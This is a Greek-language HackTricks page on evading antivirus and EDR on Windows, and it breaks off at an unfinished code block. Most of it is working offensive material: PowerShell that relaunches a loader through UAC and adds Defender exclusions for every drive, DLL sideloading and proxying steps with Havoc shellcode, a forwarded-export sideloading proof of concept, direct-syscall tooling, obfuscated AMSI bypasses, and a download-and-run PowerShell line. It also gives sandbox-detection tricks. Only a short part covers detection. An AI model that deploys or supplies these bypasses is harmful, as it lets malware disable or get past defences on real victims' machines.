# Παράκαμψη antivirus (AV)

{{#include ../banners/hacktricks-training.md}}

**Αυτή η σελίδα γράφτηκε αρχικά από** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Διακοπή Defender

- [defendnot](https://github.com/es3n1n/defendnot): Ένα εργαλείο για να σταματήσει τη λειτουργία του Windows Defender.
- [no-defender](https://github.com/es3n1n/no-defender): Ένα εργαλείο για να σταματήσει τη λειτουργία του Windows Defender, προσποιούμενο ότι είναι άλλο antivirus.
- [Απενεργοποίηση του Defender αν είστε admin](basic-powershell-for-pentesters/README.md)

### Παραπλανητικό UAC τύπου installer πριν από την αλλοίωση του Defender

Δημόσια loaders που μεταμφιέζονται σε cheats παιχνιδιών συχνά διατίθενται ως unsigned installers Node.js/Nexe, οι οποίοι πρώτα **ζητούν από τον χρήστη αυξημένα δικαιώματα** και μόνο μετά εξουδετερώνουν το Defender. Η διαδικασία είναι απλή:

1. Ελέγχει αν υπάρχουν δικαιώματα διαχειριστή με το `net session`. Η εντολή πετυχαίνει μόνο όταν ο χρήστης διαθέτει δικαιώματα admin, επομένως η αποτυχία υποδεικνύει ότι ο loader εκτελείται ως standard user.
2. Επανεκκινεί αμέσως τον εαυτό του με το ρήμα `RunAs`, ώστε να εμφανιστεί η αναμενόμενη προτροπή συναίνεσης UAC, διατηρώντας παράλληλα την αρχική γραμμή εντολών.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

Τα θύματα πιστεύουν ήδη ότι εγκαθιστούν «σπασμένο» λογισμικό, επομένως συνήθως αποδέχονται την προτροπή, δίνοντας στο malware τα δικαιώματα που χρειάζεται για να αλλάξει την πολιτική του Defender.<sup>[[26]](#references)</sup>

### Καθολικές εξαιρέσεις `MpPreference` για κάθε γράμμα μονάδας δίσκου

Αφού αποκτήσουν αυξημένα δικαιώματα, οι αλυσίδες τύπου GachiLoader μεγιστοποιούν τα τυφλά σημεία του Defender αντί να απενεργοποιήσουν εντελώς την υπηρεσία. Αρχικά, ο loader τερματίζει τη διεργασία παρακολούθησης του GUI (`taskkill /F /IM SecHealthUI.exe`) και έπειτα προσθέτει **εξαιρετικά ευρείες εξαιρέσεις**, ώστε να μην είναι δυνατή η σάρωση κάθε προφίλ χρήστη, καταλόγου συστήματος και αφαιρούμενου δίσκου:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Βασικές παρατηρήσεις:

- Ο βρόχος διατρέχει κάθε προσαρτημένο σύστημα αρχείων (D:\, E:\, USB sticks κ.λπ.), επομένως **οποιοδήποτε μελλοντικό payload αποθηκευτεί οπουδήποτε στον δίσκο αγνοείται**.
- Ο αποκλεισμός της επέκτασης `.sys` είναι προνοητικός — οι attackers διατηρούν έτσι τη δυνατότητα να φορτώσουν αργότερα unsigned drivers χωρίς να χρειαστεί να πειράξουν ξανά το Defender.
- Όλες οι αλλαγές αποθηκεύονται στο `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, επιτρέποντας στα επόμενα στάδια να επιβεβαιώσουν ότι οι εξαιρέσεις παραμένουν ή να τις επεκτείνουν χωρίς να ενεργοποιήσουν ξανά το UAC.

Εφόσον δεν διακόπτεται καμία υπηρεσία του Defender, οι απλοϊκοί έλεγχοι κατάστασης εξακολουθούν να αναφέρουν «το antivirus είναι ενεργό», παρότι η επιθεώρηση σε πραγματικό χρόνο δεν ελέγχει ποτέ αυτές τις διαδρομές.<sup>[[26]](#references)</sup>

## **Μεθοδολογία AV Evasion**

Σήμερα, τα AV χρησιμοποιούν διαφορετικές μεθόδους για να ελέγξουν αν ένα αρχείο είναι κακόβουλο ή όχι: static detection, dynamic analysis και, στα πιο προηγμένα EDR, behavioural analysis.

### **Static detection**

Το Static detection επιτυγχάνεται με τον εντοπισμό γνωστών κακόβουλων strings ή byte arrays σε ένα binary ή script, καθώς και με την εξαγωγή πληροφοριών από το ίδιο το αρχείο (π.χ. περιγραφή αρχείου, όνομα εταιρείας, digital signatures, εικονίδιο, checksum κ.λπ.). Αυτό σημαίνει ότι η χρήση γνωστών δημόσιων εργαλείων μπορεί να οδηγήσει ευκολότερα στον εντοπισμό σας, καθώς πιθανότατα έχουν ήδη αναλυθεί και επισημανθεί ως κακόβουλα. Υπάρχουν μερικοί τρόποι να παρακάμψετε αυτό το είδος εντοπισμού:

- **Encryption**

Αν κρυπτογραφήσετε το binary, το AV δεν θα μπορεί να εντοπίσει το πρόγραμμά σας, αλλά θα χρειαστείτε κάποιο είδος loader για να το αποκρυπτογραφήσει και να το εκτελέσει στη μνήμη.

- **Obfuscation**

Μερικές φορές αρκεί να αλλάξετε ορισμένα strings στο binary ή στο script σας για να περάσει απαρατήρητο από το AV, αλλά αυτό μπορεί να είναι χρονοβόρο, ανάλογα με το τι προσπαθείτε να αποκρύψετε.

- **Custom tooling**

Αν αναπτύξετε τα δικά σας εργαλεία, δεν θα υπάρχουν γνωστές κακόβουλες υπογραφές, αλλά αυτό απαιτεί πολύ χρόνο και προσπάθεια.

> [!TIP]
> Ένας καλός τρόπος για να ελέγξετε το αρχείο σας έναντι του static detection του Windows Defender είναι το [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Χωρίζει το αρχείο σε πολλά τμήματα και ζητά από το Defender να σαρώσει το καθένα ξεχωριστά. Έτσι, μπορεί να σας δείξει ακριβώς ποια strings ή bytes στο binary σας επισημαίνονται.

Συνιστώ ανεπιφύλακτα να δείτε αυτήν την [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) σχετικά με το πρακτικό AV Evasion.

### **Dynamic analysis**

Dynamic analysis είναι όταν το AV εκτελεί το binary σας σε ένα sandbox και παρακολουθεί για κακόβουλη δραστηριότητα (π.χ. απόπειρα αποκρυπτογράφησης και ανάγνωσης των κωδικών πρόσβασης του browser σας, εκτέλεση minidump στο LSASS κ.λπ.). Αυτό μπορεί να είναι κάπως πιο δύσκολο, αλλά μπορείτε να κάνετε τα εξής για να αποφύγετε τα sandboxes.

- **Αναμονή πριν από την εκτέλεση** Ανάλογα με την υλοποίηση, μπορεί να είναι ένας εξαιρετικός τρόπος παράκαμψης του dynamic analysis του AV. Τα AV έχουν πολύ λίγο χρόνο για να σαρώσουν αρχεία χωρίς να διακόψουν τη ροή εργασίας του χρήστη, επομένως η χρήση μεγάλων χρόνων αναμονής μπορεί να δυσκολέψει την ανάλυση των binaries. Το πρόβλημα είναι ότι πολλά AV sandboxes μπορούν απλώς να παραλείψουν την αναμονή, ανάλογα με τον τρόπο υλοποίησής τους.
- **Έλεγχος των πόρων του μηχανήματος** Συνήθως, τα sandboxes διαθέτουν πολύ περιορισμένους πόρους (π.χ. < 2GB RAM), διαφορετικά θα μπορούσαν να επιβραδύνουν το μηχάνημα του χρήστη. Μπορείτε επίσης να γίνετε αρκετά δημιουργικοί, ελέγχοντας, για παράδειγμα, τη θερμοκρασία της CPU ή ακόμη και τις ταχύτητες των ανεμιστήρων — δεν υλοποιούνται όλα αυτά στο sandbox.
- **Έλεγχοι ειδικοί για το μηχάνημα** Αν θέλετε να στοχεύσετε έναν χρήστη του οποίου ο σταθμός εργασίας είναι συνδεδεμένος στον τομέα "contoso.local", μπορείτε να ελέγξετε τον τομέα του υπολογιστή για να δείτε αν αντιστοιχεί σε αυτόν που καθορίσατε. Αν δεν αντιστοιχεί, μπορείτε να τερματίσετε το πρόγραμμά σας.

Όπως αποδεικνύεται, το computername του Microsoft Defender Sandbox είναι HAL9TH. Επομένως, μπορείτε να ελέγξετε το όνομα του υπολογιστή στο malware σας πριν από την εκτέλεσή του. Αν το όνομα είναι HAL9TH, σημαίνει ότι βρίσκεστε μέσα στο sandbox του Defender, οπότε μπορείτε να τερματίσετε το πρόγραμμά σας.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>πηγή: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Μερικές ακόμη πολύ καλές συμβουλές από τον [@mgeeky](https://twitter.com/mariuszbit) για την αντιμετώπιση των sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> κανάλι #malware-dev</p></figcaption></figure>

Όπως είπαμε νωρίτερα σε αυτήν την ανάρτηση, τα **δημόσια εργαλεία** αργά ή γρήγορα **εντοπίζονται**, οπότε θα πρέπει να αναρωτηθείτε το εξής:

Για παράδειγμα, αν θέλετε να κάνετε dump το LSASS, **χρειάζεται πραγματικά να χρησιμοποιήσετε το mimikatz**; Ή θα μπορούσατε να χρησιμοποιήσετε κάποιο λιγότερο γνωστό project που κάνει επίσης dump το LSASS;

Η σωστή απάντηση είναι πιθανότατα η δεύτερη. Για παράδειγμα, το mimikatz είναι πιθανότατα ένα από τα πιο επισημασμένα malware από τα AV και τα EDR — αν όχι το πιο επισημασμένο. Παρότι το ίδιο το project είναι εξαιρετικό, είναι επίσης εφιάλτης να το χρησιμοποιήσετε για να παρακάμψετε τα AV, οπότε αναζητήστε απλώς εναλλακτικές για αυτό που προσπαθείτε να πετύχετε.

> [!TIP]
> Όταν τροποποιείτε τα payloads σας για evasion, φροντίστε να **απενεργοποιήσετε την αυτόματη υποβολή δειγμάτων** στο Defender και, παρακαλώ, σοβαρά, **ΜΗΝ ΑΝΕΒΑΖΕΤΕ ΣΤΟ VIRUSTOTAL** αν στόχος σας είναι η μακροπρόθεσμη evasion. Αν θέλετε να ελέγξετε αν ένα συγκεκριμένο AV εντοπίζει το payload σας, εγκαταστήστε το σε ένα VM, προσπαθήστε να απενεργοποιήσετε την αυτόματη υποβολή δειγμάτων και δοκιμάστε το εκεί μέχρι να είστε ικανοποιημένοι με το αποτέλεσμα.

## EXEs vs DLLs

Όποτε είναι δυνατό, να **προτιμάτε πάντα τη χρήση DLLs για evasion**. Από την εμπειρία μου, τα DLL files συνήθως εντοπίζονται και αναλύονται **πολύ λιγότερο**, οπότε αυτό είναι ένα απλό κόλπο που μπορείτε να χρησιμοποιήσετε σε ορισμένες περιπτώσεις για να αποφύγετε τον εντοπισμό (αν, φυσικά, το payload σας μπορεί να εκτελεστεί ως DLL).

Όπως βλέπουμε σε αυτήν την εικόνα, ένα DLL Payload από το Havoc έχει ποσοστό εντοπισμού 4/26 στο antiscan.me, ενώ το EXE payload έχει ποσοστό εντοπισμού 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>σύγκριση στο antiscan.me ενός κανονικού Havoc EXE payload με ένα κανονικό Havoc DLL</p></figcaption></figure>

Τώρα θα δείξουμε μερικά κόλπα που μπορείτε να χρησιμοποιήσετε με DLL files για να γίνετε πολύ πιο stealthy.

## DLL Sideloading & Proxying

Το **DLL Sideloading** εκμεταλλεύεται τη σειρά αναζήτησης DLL που χρησιμοποιεί ο loader, τοποθετώντας την εφαρμογή-στόχο και τα κακόβουλα payloads δίπλα-δίπλα.

Μπορείτε να εντοπίσετε προγράμματα ευάλωτα σε DLL Sideloading χρησιμοποιώντας το [Siofra](https://github.com/Cybereason/siofra) και το ακόλουθο powershell script:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

Αυτή η εντολή θα εμφανίσει τη λίστα των προγραμμάτων μέσα στο "C:\Program Files\\" που είναι ευάλωτα σε DLL hijacking, καθώς και τα αρχεία DLL που προσπαθούν να φορτώσουν.

Συνιστώ ανεπιφύλακτα να **εξερευνήσετε μόνοι σας προγράμματα που επιδέχονται DLL Hijacking/Sideloading**. Αυτή η τεχνική είναι αρκετά stealthy όταν εφαρμόζεται σωστά, αλλά αν χρησιμοποιήσετε δημόσια γνωστά προγράμματα που επιδέχονται DLL Sideloading, μπορεί να εντοπιστείτε εύκολα.

Αν απλώς τοποθετήσετε ένα κακόβουλο DLL με το όνομα που αναμένει να φορτώσει ένα πρόγραμμα, αυτό δεν θα φορτώσει το payload σας, επειδή το πρόγραμμα αναμένει να υπάρχουν ορισμένες συγκεκριμένες συναρτήσεις μέσα σε αυτό το DLL. Για να διορθώσουμε αυτό το πρόβλημα, θα χρησιμοποιήσουμε μια άλλη τεχνική που ονομάζεται **DLL Proxying/Forwarding**.

Το **DLL Proxying** προωθεί τις κλήσεις που κάνει ένα πρόγραμμα από το proxy (και κακόβουλο) DLL στο αρχικό DLL, διατηρώντας έτσι τη λειτουργικότητα του προγράμματος και επιτρέποντάς μας να χειριστούμε την εκτέλεση του payload σας.

Θα χρησιμοποιήσω το project [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) του [@flangvik](https://twitter.com/Flangvik/).

Αυτά είναι τα βήματα που ακολούθησα:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

Η τελευταία εντολή θα μας δώσει 2 αρχεία: ένα πρότυπο πηγαίου κώδικα DLL και την αρχική DLL μετονομασμένη.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

These are the results:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Τόσο το shellcode μας (κωδικοποιημένο με το [SGN](https://github.com/EgeBalci/sgn)) όσο και το proxy DLL έχουν Detection rate 0/26 στο [antiscan.me](https://antiscan.me)! Θα το θεωρούσα επιτυχία.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> **Συνιστώ ανεπιφύλακτα** να παρακολουθήσετε το [twitch VOD του S3cur3Th1sSh1t](https://www.twitch.tv/videos/1644171543) σχετικά με το DLL Sideloading, καθώς και [το βίντεο του ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE), για να μάθετε περισσότερα και σε μεγαλύτερο βάθος για όσα συζητήσαμε.

### Κατάχρηση Forwarded Exports (ForwardSideLoading)

Οι μονάδες Windows PE μπορούν να εξάγουν συναρτήσεις που στην πραγματικότητα είναι «forwarders»: αντί να δείχνει σε κώδικα, η καταχώριση εξαγωγής περιέχει μια συμβολοσειρά ASCII της μορφής `TargetDll.TargetFunc`. Όταν ένας caller επιλύει την εξαγωγή, ο Windows loader:

- Φορτώνει το `TargetDll`, αν δεν έχει ήδη φορτωθεί
- Επιλύει το `TargetFunc` από αυτό

Βασικές συμπεριφορές που πρέπει να κατανοήσετε:
- Αν το `TargetDll` είναι KnownDLL, παρέχεται από τον προστατευμένο χώρο ονομάτων KnownDLLs (π.χ. ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Αν το `TargetDll` δεν είναι KnownDLL, χρησιμοποιείται η κανονική σειρά αναζήτησης DLL, η οποία περιλαμβάνει τον κατάλογο της μονάδας που εκτελεί την επίλυση του forwarder.

Αυτό επιτρέπει μια έμμεση primitive sideloading: εντοπίστε ένα υπογεγραμμένο DLL που εξάγει μια συνάρτηση η οποία γίνεται forward σε όνομα μονάδας που δεν είναι KnownDLL και, στη συνέχεια, τοποθετήστε το υπογεγραμμένο DLL στον ίδιο κατάλογο με ένα DLL που ελέγχει ο επιτιθέμενος και έχει ακριβώς το όνομα του module-στόχου στο οποίο γίνεται forward. Όταν κληθεί η forwarded export, ο loader επιλύει το forward και φορτώνει το DLL σας από τον ίδιο κατάλογο, εκτελώντας το DllMain σας.<sup>[[13]](#references)</sup>

Παράδειγμα που παρατηρήθηκε στα Windows 11:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` δεν είναι KnownDLL, επομένως επιλύεται μέσω της κανονικής σειράς αναζήτησης.

PoC (copy-paste):
1) Αντιγράψτε το υπογεγραμμένο system DLL σε έναν εγγράψιμο φάκελο
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Τοποθετήστε ένα κακόβουλο `NCRYPTPROV.dll` στον ίδιο φάκελο. Αρκεί ένα ελάχιστο DllMain για την εκτέλεση κώδικα· δεν χρειάζεται να υλοποιήσετε τη συνάρτηση που προωθείται για να ενεργοποιηθεί το DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) Ενεργοποιήστε το forward με ένα signed LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Παρατηρούμενη συμπεριφορά:
- Το rundll32 (signed) φορτώνει το side-by-side `keyiso.dll` (signed)
- Κατά την επίλυση του `KeyIsoSetAuditingInterface`, ο loader ακολουθεί το forward προς το `NCRYPTPROV.SetAuditingInterface`
- Στη συνέχεια, ο loader φορτώνει το `NCRYPTPROV.dll` από το `C:\test` και εκτελεί το `DllMain` του
- Αν δεν έχει υλοποιηθεί το `SetAuditingInterface`, θα εμφανιστεί σφάλμα "missing API" μόνο αφού έχει ήδη εκτελεστεί το `DllMain`

Συμβουλές για hunting:
- Εστιάστε σε forwarded exports όπου το target module δεν είναι KnownDLL. Τα KnownDLLs παρατίθενται στο `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Μπορείτε να απαριθμήσετε forwarded exports με εργαλεία όπως:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Δείτε την απογραφή forwarder των Windows 11 για να αναζητήσετε υποψήφιες επιλογές: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Ιδέες για ανίχνευση/άμυνα:
- Παρακολουθήστε τα LOLBins (π.χ., rundll32.exe) που φορτώνουν υπογεγραμμένα DLL από διαδρομές εκτός συστήματος και στη συνέχεια φορτώνουν non-KnownDLLs με το ίδιο βασικό όνομα από αυτόν τον κατάλογο
- Ειδοποιήστε για αλυσίδες διεργασιών/μονάδων όπως: `rundll32.exe` → `keyiso.dll` εκτός συστήματος → `NCRYPTPROV.dll` σε διαδρομές εγγράψιμες από τον χρήστη
- Επιβάλετε πολιτικές ακεραιότητας κώδικα (WDAC/AppLocker) και απαγορεύστε δικαιώματα εγγραφής+εκτέλεσης στους καταλόγους εφαρμογών

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Μπορείτε να χρησιμοποιήσετε το Freeze για να φορτώσετε και να εκτελέσετε το shellcode σας με stealth τρόπο.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Το Evasion είναι απλώς ένα παιχνίδι γάτας και ποντικιού: αυτό που λειτουργεί σήμερα μπορεί να ανιχνεύεται αύριο, επομένως μην βασίζεστε ποτέ σε ένα μόνο εργαλείο. Αν είναι δυνατόν, δοκιμάστε να συνδυάσετε πολλές τεχνικές evasion.

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

Τα EDR συχνά τοποθετούν **user-mode inline hooks** στα syscall stubs του `ntdll.dll`. Για να παρακάμψετε αυτά τα hooks, μπορείτε να δημιουργήσετε **direct** ή **indirect** syscall stubs που φορτώνουν το σωστό **SSN** (System Service Number) και μεταβαίνουν σε kernel mode χωρίς να εκτελέσουν το hooked export entrypoint.<sup>[[32]](#references)</sup>

**Επιλογές κλήσης:**
- **Direct (embedded)**: προσθέτει μια εντολή `syscall`/`sysenter`/`SVC #0` στο generated stub (χωρίς να γίνεται πρόσβαση σε export του `ntdll`).
- **Indirect**: μεταπηδά σε ένα υπάρχον `syscall` gadget μέσα στο `ntdll`, ώστε η μετάβαση στον kernel να φαίνεται ότι προέρχεται από το `ntdll` (χρήσιμο για heuristic evasion). Το **randomized indirect** επιλέγει ένα gadget από μια δεξαμενή σε κάθε κλήση.
- **Egg-hunt**: αποφεύγει την ενσωμάτωση της στατικής ακολουθίας opcode `0F 05` στον δίσκο· εντοπίζει μια syscall sequence κατά το runtime.

**Στρατηγικές επίλυσης SSN ανθεκτικές στα hooks:**
- **FreshyCalls (VA sort)**: συνάγει SSN ταξινομώντας τα syscall stubs βάσει virtual address αντί να διαβάζει τα bytes των stubs.
- **SyscallsFromDisk**: κάνει map ένα καθαρό `\KnownDlls\ntdll.dll`, διαβάζει τα SSN από το `.text` του και έπειτα κάνει unmap (παρακάμπτει όλα τα in-memory hooks).
- **RecycledGate**: συνδυάζει τη συναγωγή SSN με ταξινόμηση VA και την επικύρωση opcode όταν ένα stub είναι καθαρό· αν εντοπιστεί hook, επιστρέφει στη συναγωγή μέσω VA.
- **HW Breakpoint**: θέτει DR0 στην εντολή `syscall` και χρησιμοποιεί ένα VEH για να καταγράψει το SSN από το `EAX` κατά το runtime, χωρίς να αναλύει hooked bytes.

Παράδειγμα χρήσης του SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

## AMSI (Anti-Malware Scan Interface)

Το AMSI δημιουργήθηκε για να αποτρέπει το "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Αρχικά, τα AV μπορούσαν να σαρώσουν μόνο **αρχεία στον δίσκο**, οπότε αν κατάφερνες με κάποιον τρόπο να εκτελέσεις payloads **απευθείας στη μνήμη**, το AV δεν μπορούσε να κάνει τίποτα για να το αποτρέψει, καθώς δεν είχε αρκετή ορατότητα.

Η λειτουργία AMSI είναι ενσωματωμένη στα εξής στοιχεία των Windows.

- User Account Control, ή UAC (ανύψωση δικαιωμάτων για εγκατάσταση EXE, COM, MSI ή ActiveX)
- PowerShell (scripts, διαδραστική χρήση και δυναμική αξιολόγηση κώδικα)
- Windows Script Host (wscript.exe και cscript.exe)
- JavaScript και VBScript
- Office VBA macros

Επιτρέπει στις λύσεις antivirus να επιθεωρούν τη συμπεριφορά των scripts, εκθέτοντας το περιεχόμενό τους σε μορφή που είναι μη κρυπτογραφημένη και μη συγκαλυμμένη.

Η εκτέλεση του `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` θα προκαλέσει την ακόλουθη ειδοποίηση στο Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Παρατηρήστε ότι προσθέτει στην αρχή το `amsi:` και έπειτα τη διαδρομή προς το εκτελέσιμο αρχείο από το οποίο εκτελέστηκε το script, στην προκειμένη περίπτωση, το powershell.exe

Δεν αποθηκεύσαμε κανένα αρχείο στον δίσκο, αλλά παρ' όλα αυτά εντοπιστήκαμε στη μνήμη λόγω του AMSI.

Επιπλέον, από την έκδοση **.NET 4.8** και μετά, ο κώδικας C# περνά επίσης από το AMSI. Αυτό επηρεάζει ακόμη και τη χρήση του `Assembly.Load(byte[])` για εκτέλεση στη μνήμη. Γι' αυτό, για εκτέλεση στη μνήμη, συνιστάται η χρήση παλαιότερων εκδόσεων του .NET (όπως η 4.7.2 ή παλαιότερη), αν θέλετε να αποφύγετε το AMSI.

Υπάρχουν μερικοί τρόποι παράκαμψης του AMSI:

- **Obfuscation**

Καθώς το AMSI βασίζεται κυρίως σε στατικές ανιχνεύσεις, η τροποποίηση των scripts που προσπαθείτε να φορτώσετε μπορεί να είναι ένας καλός τρόπος αποφυγής του εντοπισμού.

Ωστόσο, το AMSI έχει τη δυνατότητα να αποσυσκοτίζει scripts, ακόμη κι αν έχουν πολλαπλά επίπεδα, οπότε το obfuscation μπορεί να είναι κακή επιλογή, ανάλογα με τον τρόπο εφαρμογής του. Αυτό κάνει την αποφυγή του όχι και τόσο απλή. Παρ' όλα αυτά, μερικές φορές αρκεί να αλλάξετε μερικά ονόματα μεταβλητών, οπότε όλα εξαρτώνται από το πόσο έντονα έχει επισημανθεί κάτι.

- **AMSI Bypass**

Καθώς το AMSI υλοποιείται με τη φόρτωση ενός DLL στη διεργασία του powershell (καθώς και των cscript.exe, wscript.exe κ.λπ.), είναι εύκολο να παραποιηθεί, ακόμη και όταν εκτελείται ως μη προνομιούχος χρήστης. Λόγω αυτού του ελαττώματος στην υλοποίηση του AMSI, οι ερευνητές έχουν βρει πολλούς τρόπους αποφυγής της σάρωσης AMSI.

**Πρόκληση σφάλματος**

Η πρόκληση αποτυχίας στην αρχικοποίηση του AMSI (amsiInitFailed) έχει ως αποτέλεσμα να μην ξεκινά καμία σάρωση για την τρέχουσα διεργασία. Αυτό αποκαλύφθηκε αρχικά από τον [Matt Graeber](https://twitter.com/mattifestation), και η Microsoft ανέπτυξε μια υπογραφή για να αποτρέψει την ευρύτερη χρήση του.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Αρκούσε μία μόνο γραμμή κώδικα PowerShell για να καταστήσει το AMSI μη λειτουργικό για την τρέχουσα διεργασία PowerShell. Αυτή η γραμμή, φυσικά, έχει εντοπιστεί από το ίδιο το AMSI, οπότε χρειάζεται κάποια τροποποίηση για να χρησιμοποιηθεί αυτή η τεχνική.

Ακολουθεί ένα τροποποιημένο AMSI bypass, που πήρα από αυτό το [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Έχε υπόψη ότι αυτό πιθανότατα θα επισημανθεί μόλις δημοσιευτεί αυτή η ανάρτηση, επομένως δεν θα πρέπει να δημοσιεύσεις κώδικα αν σκοπεύεις να παραμείνεις μη ανιχνεύσιμος.

**Memory Patching**

Αυτή η τεχνική ανακαλύφθηκε αρχικά από τον [@RastaMouse](https://twitter.com/_RastaMouse/) και περιλαμβάνει τον εντοπισμό της διεύθυνσης της συνάρτησης "AmsiScanBuffer" στο amsi.dll (η οποία είναι υπεύθυνη για τη σάρωση της εισόδου που παρέχει ο χρήστης) και την αντικατάστασή της με εντολές που επιστρέφουν τον κωδικό E_INVALIDARG. Με αυτόν τον τρόπο, η πραγματική σάρωση επιστρέφει 0, το οποίο ερμηνεύεται ως καθαρό αποτέλεσμα.

> [!TIP]
> Διάβασε το [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) για μια πιο λεπτομερή εξήγηση.

Υπάρχουν επίσης πολλές άλλες τεχνικές για την παράκαμψη του AMSI με powershell. Δες [**αυτή τη σελίδα**](basic-powershell-for-pentesters/index.html#amsi-bypass) και [**αυτό το repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) για να μάθεις περισσότερα.

### Αποκλεισμός του AMSI αποτρέποντας τη φόρτωση του amsi.dll (LdrLoadDll hook)

Το AMSI αρχικοποιείται μόνο αφού φορτωθεί το `amsi.dll` στην τρέχουσα διεργασία. Μια ανθεκτική παράκαμψη, ανεξάρτητη από τη γλώσσα, είναι η τοποθέτηση ενός user-mode hook στο `ntdll!LdrLoadDll`, το οποίο επιστρέφει σφάλμα όταν το ζητούμενο module είναι το `amsi.dll`. Ως αποτέλεσμα, το AMSI δεν φορτώνεται ποτέ και δεν πραγματοποιούνται σαρώσεις για τη συγκεκριμένη διεργασία.<sup>[[23]](#references)</sup>

Περίγραμμα υλοποίησης (ψευδοκώδικας x64 C/C++):
```c
#include <windows.h>
